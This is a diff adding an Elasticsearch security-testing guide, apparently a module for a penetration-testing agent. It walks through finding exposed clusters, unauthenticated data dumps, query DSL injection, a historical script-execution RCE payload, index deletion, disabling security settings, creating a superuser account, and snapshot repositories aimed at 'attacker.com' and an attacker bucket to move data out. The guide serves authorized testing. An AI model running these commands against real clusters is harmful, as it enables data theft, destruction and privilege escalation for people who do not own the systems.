@@ -1,0 +1,421 @@
+<elasticsearch_security_guide>
+<title>ELASTICSEARCH SECURITY TESTING</title>
+
+<critical>Elasticsearch is a distributed search and analytics engine widely used for logging, search, and data analysis. Security vulnerabilities include unauthenticated access, query injection, script execution, cluster manipulation, and data exposure. Many Elasticsearch instances are exposed without authentication, leading to massive data breaches.</critical>
+
+<scope>
+- Unauthenticated cluster access
+- Query DSL injection
+- Scripting and code execution
+- Index and document manipulation
+- Cluster configuration exposure
+- API key and role security
+- X-Pack/Security features bypass
+- Snapshot and restore exploitation
+</scope>
+
+<methodology>
+1. Identify Elasticsearch instances and versions.
+2. Test for unauthenticated access to cluster APIs.
+3. Enumerate indices, mappings, and data.
+4. Probe for query injection in application searches.
+5. Test script execution and dangerous features.
+</methodology>
+
+<reconnaissance>
+<instance_discovery>
+{% raw %}
+# Default ports:
+9200  # HTTP REST API
+9300  # Transport protocol (internal)
+
+# Discovery methods:
+nmap -p 9200,9300 -sV target.com
+
+# Shodan queries:
+port:9200 elasticsearch
+product:elasticsearch
+elasticsearch country:US
+
+# Common endpoints:
+http://target:9200/
+http://target:9200/_cluster/health
+http://target:9200/_cat/indices
+
+# Cloud services:
+# AWS OpenSearch (formerly Elasticsearch Service)
+# Elastic Cloud
+# Azure Cognitive Search (Elasticsearch-compatible)
+{% endraw %}
+</instance_discovery>
+
+<version_fingerprinting>
+{% raw %}
+# Get cluster information:
+curl http://target:9200/
+
+# Response reveals:
+{
+  "name": "node-1",
+  "cluster_name": "elasticsearch",
+  "cluster_uuid": "xxx",
+  "version": {
+    "number": "8.x.x",
+    "build_type": "docker",
+    ...
+  }
+}
+
+# Version-specific vulnerabilities:
+# ES < 1.2: CVE-2014-3120 (script execution)
+# ES < 1.4.3: CVE-2015-1427 (Groovy sandbox bypass)
+# ES < 6.4.3/5.6.13: CVE-2018-17246 (LFI via plugin)
+{% endraw %}
+</version_fingerprinting>
+</reconnaissance>
+
+<unauthorized_access>
+<no_authentication>
+{% raw %}
+# Test basic access:
+curl http://target:9200/
+# If returns cluster info, no auth required
+
+# Cluster enumeration:
+curl http://target:9200/_cluster/health
+curl http://target:9200/_cluster/state
+curl http://target:9200/_cluster/settings
+curl http://target:9200/_nodes
+
+# Index enumeration:
+curl http://target:9200/_cat/indices?v
+curl http://target:9200/_aliases
+curl http://target:9200/_mapping
+
+# Data access:
+curl http://target:9200/_search?q=*
+curl http://target:9200/{index}/_search?size=1000
+curl http://target:9200/{index}/_doc/{id}
+{% endraw %}
+</no_authentication>
+
+<cat_api_exposure>
+{% raw %}
+# Human-readable API endpoints:
+curl http://target:9200/_cat/health
+curl http://target:9200/_cat/nodes
+curl http://target:9200/_cat/indices
+curl http://target:9200/_cat/shards
+curl http://target:9200/_cat/segments
+curl http://target:9200/_cat/count
+curl http://target:9200/_cat/recovery
+curl http://target:9200/_cat/allocation
+curl http://target:9200/_cat/plugins
+curl http://target:9200/_cat/templates
+{% endraw %}
+</cat_api_exposure>
+</unauthorized_access>
+
+<query_injection>
+<search_injection>
+{% raw %}
+# If application uses user input in queries:
+
+# Basic query injection:
+GET /products/_search
+{
+  "query": {
+    "match": {
+      "name": "user_input"
+    }
+  }
+}
+
+# Injecting match_all:
+user_input: "* OR *:*"
+
+# Boolean injection:
+user_input: '" OR "1"="1'
+
+# Field exposure:
+user_input: "* OR _exists_:password"
+
+# Wildcard abuse:
+user_input: "*"
+{% endraw %}
+</search_injection>
+
+<dsl_injection>
+{% raw %}
+# Query DSL manipulation:
+# If JSON structure can be modified:
+
+# Original:
+{"query": {"match": {"title": "USER_INPUT"}}}
+
+# Injected:
+{"query": {"match": {"title": ""}}, "script_fields": {"test": {"script": "doc['password'].value"}}}
+
+# Index escape:
+# If index name from user input:
+GET /{user_input}/_search
+# Input: *  (search all indices)
+# Input: .security-*  (access security indices)
+{% endraw %}
+</dsl_injection>
+</query_injection>
+
+<script_exploitation>
+<painless_scripts>
+{% raw %}
+# Painless scripting (ES 5+):
+
+# Script in query:
+GET /_search
+{
+  "script_fields": {
+    "test": {
+      "script": {
+        "lang": "painless",
+        "source": "doc['field'].value"
+      }
+    }
+  }
+}
+
+# Stored scripts:
+POST _scripts/malicious
+{
+  "script": {
+    "lang": "painless",
+    "source": "return params.value"
+  }
+}
+
+# Runtime fields exploitation:
+GET /_search
+{
+  "runtime_mappings": {
+    "malicious_field": {
+      "type": "keyword",
+      "script": "emit(doc['secret'].value)"
+    }
+  }
+}
+{% endraw %}
+</painless_scripts>
+
+<legacy_scripts>
+{% raw %}
+# Groovy scripts (ES < 2.0, historical):
+# CVE-2015-1427 Groovy sandbox bypass
+
+# MVEL scripts (ES < 1.2):
+# CVE-2014-3120 RCE
+
+# Example (historical):
+POST /_search
+{
+  "script_fields": {
+    "exp": {
+      "script": "java.lang.Runtime.getRuntime().exec('id')"
+    }
+  }
+}
+{% endraw %}
+</legacy_scripts>
+</script_exploitation>
+
+<data_manipulation>
+<index_operations>
+{% raw %}
+# Create index:
+PUT /malicious_index
+{
+  "mappings": {...}
+}
+
+# Delete index (destructive):
+DELETE /target_index
+
+# Modify data:
+POST /index/_doc/1
+{
+  "field": "modified_value"
+}
+
+# Bulk operations:
+POST /_bulk
+{"index": {"_index": "test"}}
+{"field": "value"}
+
+# Reindex (data theft):
+POST /_reindex
+{
+  "source": {"index": "sensitive"},
+  "dest": {"index": "exfiltrated"}
+}
+{% endraw %}
+</index_operations>
+
+<alias_manipulation>
+{% raw %}
+# Create alias pointing to sensitive index:
+POST /_aliases
+{
+  "actions": [
+    {"add": {"index": ".security-7", "alias": "exposed"}}
+  ]
+}
+
+# Filter bypass via alias:
+# Create alias with filter that exposes more data
+{% endraw %}
+</alias_manipulation>
+</data_manipulation>
+
+<cluster_exploitation>
+<settings_modification>
+{% raw %}
+# Dangerous cluster settings:
+PUT /_cluster/settings
+{
+  "persistent": {
+    "script.allowed_types": "inline",
+    "script.allowed_contexts": "search, update"
+  }
+}
+
+# Disable security (if X-Pack):
+PUT /_cluster/settings
+{
+  "persistent": {
+    "xpack.security.enabled": false
+  }
+}
+
+# Repository manipulation:
+PUT /_snapshot/malicious_repo
+{
+  "type": "url",
+  "settings": {
+    "url": "http://attacker.com/snapshot"
+  }
+}
+{% endraw %}
+</settings_modification>
+
+<snapshot_attacks>
+{% raw %}
+# List snapshots:
+GET /_snapshot/_all
+GET /_snapshot/repo_name/_all
+
+# Restore snapshot (data access):
+POST /_snapshot/repo/snapshot/_restore
+{
+  "indices": "sensitive_*"
+}
+
+# Create snapshot to external location:
+PUT /_snapshot/exfil
+{
+  "type": "s3",
+  "settings": {
+    "bucket": "attacker-bucket"
+  }
+}
+{% endraw %}
+</snapshot_attacks>
+</cluster_exploitation>
+
+<xpack_security>
+<security_bypass>
+{% raw %}
+# Check if security enabled:
+GET /_xpack
+GET /_security/_authenticate
+
+# API key exploitation:
+# If API key exposed, test scope
+GET /_security/api_key
+
+# Role enumeration:
+GET /_security/role
+GET /_security/user
+
+# Privilege escalation:
+POST /_security/user/attacker
+{
+  "password": "password",
+  "roles": ["superuser"]
+}
+{% endraw %}
+</security_bypass>
+</xpack_security>
+
+<common_payloads>
+{% raw %}
+# Unauthenticated access:
+curl http://target:9200/
+curl http://target:9200/_cat/indices
+
+# Data dump:
+curl http://target:9200/*/_search?size=10000
+
+# Query injection:
+{"query": {"match_all": {}}}
+
+# Script execution:
+{"script_fields": {"test": {"script": "doc['field'].value"}}}
+
+# Index deletion (be careful):
+# curl -X DELETE http://target:9200/index
+
+# Sensitive indices:
+GET /.security-*/_search
+GET /.kibana*/_search
+GET /logs-*/_search
+{% endraw %}
+</common_payloads>
+
+<validation>
+1. Demonstrate unauthenticated access with data retrieval.
+2. Show query injection extracting unintended data.
+3. Prove script execution with data exposure.
+4. Document cluster configuration access and modification.
+5. Provide evidence of sensitive index access.
+</validation>
+
+<false_positives>
+- Elasticsearch behind proper network segmentation
+- X-Pack/Security properly configured with authentication
+- Role-based access control limiting data access
+- Index-level security preventing sensitive access
+- Network policies restricting cluster communication
+</false_positives>
+
+<impact>
+- Complete data exposure (logs, user data, secrets)
+- Remote code execution via script injection
+- Cluster manipulation and denial of service
+- Data theft through snapshot/restore
+- Privilege escalation via security manipulation
+- Lateral movement via exposed credentials in logs
+</impact>
+
+<pro_tips>
+1. Always check for unauthenticated access first - very common.
+2. The _cat API provides human-readable enumeration.
+3. .security-* indices contain user/role information.
+4. .kibana* indices may contain saved searches with credentials.
+5. Log indices often contain sensitive application data.
+6. Script execution is restricted but still exploitable.
+7. Snapshots can exfiltrate data to attacker-controlled storage.
+8. Cluster settings modification can disable security.
+9. AWS OpenSearch has different authentication models.
+10. Query DSL injection is underexplored attack vector.
+</pro_tips>
+
+<remember>Elasticsearch security depends on authentication and network isolation. The vast majority of exposed Elasticsearch instances lack authentication, leading to trivial data access. Always test for unauthenticated access and enumerate all indices for sensitive data.</remember>
+</elasticsearch_security_guide>
